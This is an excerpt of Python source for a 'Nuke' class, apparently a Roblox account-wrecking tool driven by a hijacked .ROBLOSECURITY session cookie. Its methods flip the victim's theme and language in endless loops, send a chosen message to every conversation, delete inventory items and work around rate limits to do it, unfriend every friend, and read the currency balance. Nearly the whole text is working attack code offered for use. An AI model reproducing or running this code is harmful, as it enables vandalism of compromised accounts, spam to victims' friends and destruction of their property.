...
class Nuke:
  ...
  def flash(self):
    ...
    try:
      while True:
        requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers,data={"themeType": "Light"})
        requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers,data={"themeType": "Dark"})
  ...
  def changeLanguage(self):
    while True:
      requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(self.cookie)},headers=self.headers,data={"supportedLocaleCode": "ja_jp"})
      requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(self.cookie)},headers=self.headers,data={"supportedLocaleCode": "ko_kr"})
  def messageAll(self, message):
    print("[", end="")
    cprint(" NUKER ", "magenta", end="")
    print("] " , end="")
    cprint("Messaging friends....", "magenta")
    conversations = requests.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers).json()
    for conversation in conversations:
      requests.post("https://chat.roblox.com/v2/send-message",data={"conversationId": conversation["id"], "message": message}, cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers)
      print("[", end="")
      cprint(" NUKER ", "magenta", end="")
      print("] " , end="")
  ...
  def removeItems(self):
    ...
    for item in items:
      ...
      response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": str(id)},cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers)
      if response.status_code == 429:
        time.sleep(10)
        response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": id},cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers)
        print("[", end="")
        cprint(" NUKER ", "magenta", end="")
        print("] " , end="")
  ...
  def unfriend(self):
    ...
    for i in friendIds:
      time.sleep(0.1)
      print(requests.post(f"https://friends.roblox.com/v1/users/{i}/unfriend",cookies={'.ROBLOSECURITY': str(self.cookie)}, headers=self.headers).text)
      print("[", end="")
      cprint(" NUKER ", "magenta", end="")
      print("] " , end="")
  ...
  def check(self):
    ...
    self.message = input("> ")
    return requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(self.cookie)})
  def start(self):
    os.system("")
    check = self.check()
